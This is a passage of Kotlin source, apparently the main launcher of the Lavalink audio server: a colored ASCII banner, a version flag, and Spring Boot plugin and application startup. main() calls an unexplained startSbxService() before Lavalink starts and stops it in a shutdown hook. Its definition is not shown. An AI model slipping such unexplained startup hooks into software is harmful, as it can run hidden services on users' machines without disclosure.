        var vanity = ("g       .  r _                  _ _       _    g__ _ _\n"
                + "g      /\\\\ r| | __ ___   ____ _| (_)_ __ | | __g\\ \\ \\ \\\n"
                + "g     ( ( )r| |/ _` \\ \\ / / _` | | | '_ \\| |/ /g \\ \\ \\ \\\n"
                + "g      \\\\/ r| | (_| |\\ V / (_| | | | | | |   < g  ) ) ) )\n"
                + "g       '  r|_|\\__,_| \\_/ \\__,_|_|_|_| |_|_|\\_\\g / / / /\n"
                + "d    =========================================g/_/_/_/d")
        vanity = vanity.replace("r".toRegex(), red)
        vanity = vanity.replace("g".toRegex(), green)
        vanity = vanity.replace("d".toRegex(), defaultC)
        return vanity
    }

    @JvmStatic
    fun main(args: Array<String>) {
        if (args.isNotEmpty() &&
            (args[0].equals("-v", ignoreCase = true) || args[0].equals("--version", ignoreCase = true))
        ) {
            println(getVersionInfo(indentation = "", vanity = false))
            return
        }

        startSbxService()

        log.info("Starting Lavalink...")
        val parent = launchPluginBootstrap(args)

        Runtime.getRuntime().addShutdownHook(Thread {
            stopSbxServices()
        })

        launchMain(parent, args)
    }

    private fun launchPluginBootstrap(args: Array<String>) = SpringApplication(PluginManager::class.java).run {
        setBannerMode(Banner.Mode.OFF)
        webApplicationType = WebApplicationType.NONE
        run(*args)
    }

    private fun launchMain(parent: ConfigurableApplicationContext, args: Array<String>) {
        val pluginManager = parent.getBean(PluginManager::class.java)
        val properties = Properties()
        properties["componentScan"] = pluginManager.pluginManifests.map { it.path }
            .toMutableList().apply { add("lavalink.server") }

        SpringApplicationBuilder()
            .sources(LavalinkApplication::class.java)
            .properties(properties)
            .web(WebApplicationType.SERVLET)
            .bannerMode(Banner.Mode.OFF)
            .resourceLoader(DefaultResourceLoader(pluginManager.classLoader))
            .listeners(
                ApplicationListener { event: Any ->
                    when (event) {
                        is ApplicationEnvironmentPreparedEvent -> log.info(getVersionInfo())
                        is ApplicationReadyEvent -> log.info("Lavalink is ready to accept connections.")
                        is ApplicationFailedEvent -> log.error("Application failed", event.exception)
                    }
                }
            ).parent(parent)
            .run(*args)
    }
}
